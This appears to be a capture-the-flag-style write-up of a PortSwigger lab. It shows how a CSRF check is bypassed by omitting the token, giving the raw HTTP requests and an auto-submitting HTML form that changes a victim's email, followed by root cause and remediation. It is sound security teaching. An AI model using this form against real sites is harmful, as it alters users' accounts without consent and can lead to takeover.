CSRF — Token Validation Depends on Token Being Present

Platform: PortSwigger Web Security Academy
Difficulty: Practitioner
Category: Cross-Site Request Forgery (CSRF)
Tools: Burp Suite, Burp Repeater, HTML, Exploit Server
Status: ✅ Solved
Challenge: 30 Days of Web Security — Day 01

1. Objective

The objective of this lab was to identify and exploit a CSRF vulnerability caused by improper validation of anti-CSRF tokens.

The application included a CSRF token in its email change requests. However, the server failed to enforce token validation when the parameter was completely absent.

2. Attack Scenario

An attacker wants to change the email address associated with an authenticated victim's account.

The attacker does not know the victim's password, session cookie, or CSRF token.

However, the attacker discovers that the application processes email changes even when the csrf parameter is missing.

By creating a cross-site HTML form without this parameter, the attacker can potentially cause the victim's browser to submit an authenticated email change request.

The attack requires the browser to include the victim's session cookie and the application to accept the request without additional verification.

3. Initial HTTP Request

After logging into the lab, I changed the email address and captured the request using Burp Suite.

The original request contained an anti-CSRF token:

POST /my-account/change-email HTTP/2
Host: <LAB-HOST>
Cookie: session=<REDACTED>
Content-Type: application/x-www-form-urlencoded

email=test%40example.net&csrf=<REDACTED>

The presence of the token indicated that the application attempted to implement CSRF protection.

However, I needed to verify whether the server enforced this protection correctly.

4. Testing Missing Token Validation

I sent the request to Burp Repeater.

Instead of replacing the token with an invalid value, I completely removed the csrf parameter.

The modified request contained only the email parameter:

POST /my-account/change-email HTTP/2
Host: <LAB-HOST>
Cookie: session=<REDACTED>
Content-Type: application/x-www-form-urlencoded

email=csrf-lab03%40example.net

The server responded:

HTTP/2 302 Found
Location: /my-account?id=wiener

I then opened the account page and confirmed that the email address had changed.

Finding: The application accepted a state-changing POST request without requiring a CSRF token.

This demonstrated that token validation could be bypassed by omitting the parameter.

5. Cross-Site Exploitation

To verify that this behavior was exploitable through a browser, I created an HTML proof of concept using the PortSwigger Exploit Server.

Proof of Concept
<!DOCTYPE html>
<html>
<body>

<form action="https://<LAB-HOST>/my-account/change-email"
      method="POST">

    <input type="hidden"
           name="email"
           value="csrf-lab03-test@example.net">

</form>

<script>
    document.forms[0].submit();
</script>

</body>
</html>

The form deliberately excludes the csrf parameter.

The JavaScript automatically submits the form when the page loads.

Attack Flow
The victim is authenticated to the vulnerable application.
The victim opens the attacker-controlled HTML page.
The browser submits a cross-site POST request.
The request contains an email parameter but no CSRF token.
The vulnerable server processes the request.
The victim's account email address changes.

The attacker does not need to read or steal the victim's session cookie.

6. Verification

I tested the proof of concept in my authenticated lab browser.

Result: The email address changed successfully.

I then used the Exploit Server's Deliver to victim functionality.

Final result: PortSwigger marked the laboratory as Solved.

This confirmed that the missing-token validation flaw was exploitable in the lab environment.

7. Root Cause

The application incorrectly treated the CSRF token as optional.

The server validated CSRF protection only when the csrf parameter was present.

When the parameter was absent, the application continued processing the state-changing request.

Root cause: Incomplete server-side enforcement of CSRF token validation.

8. Security Impact

An attacker could cause an authenticated victim to change their account email address without intending to do so.

Depending on the application's email verification and password recovery mechanisms, this could contribute to account compromise.

This laboratory demonstrated unauthorized email modification, not a complete account takeover.

9. Remediation

Recommended protections include:

Require a valid CSRF token for every relevant state-changing request.
Reject requests with missing, empty, invalid, or expired CSRF tokens.
Bind CSRF tokens appropriately to the user's session.
Validate the request origin where appropriate.
Use suitable SameSite cookie settings as defense in depth.
Require additional verification for sensitive account changes.

Key principle: Security controls must fail securely. A missing security parameter must not disable the protection.

10. Evidence

The following evidence should be retained:

Burp Repeater request with the csrf parameter removed.
Server response returning 302 Found.
Account page confirming the email change.
HTML proof of concept on the Exploit Server.
PortSwigger lab completion screen.

Session identifiers and other sensitive information must be redacted.

11. Key Takeaways

This laboratory demonstrated that the presence of a CSRF token does not automatically make an application secure.

I gained practical experience in:

Analyzing state-changing HTTP requests.
Identifying missing server-side validation.
Testing alternative request structures in Burp Repeater.
Creating an automatically submitted HTML proof of concept.
Demonstrating the complete CSRF attack flow.
Documenting the vulnerability and its remediation.

Environment: PortSwigger Web Security Academy
Testing scope: Authorized educational laboratory only.
